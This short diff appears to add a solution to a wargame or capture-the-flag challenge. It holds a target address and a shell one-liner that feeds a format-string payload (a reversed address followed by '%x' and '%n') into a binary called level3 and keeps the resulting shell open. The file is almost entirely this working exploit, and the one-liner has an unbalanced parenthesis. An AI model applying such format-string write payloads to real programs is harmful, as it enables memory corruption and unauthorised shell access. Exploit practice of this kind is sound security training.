@@ -1,0 +1,2 @@
+804988c
+python -c 'print "\x08\x04\x98\x8c"[::-1]+"%x\x40%n"';cat -) | ./level3
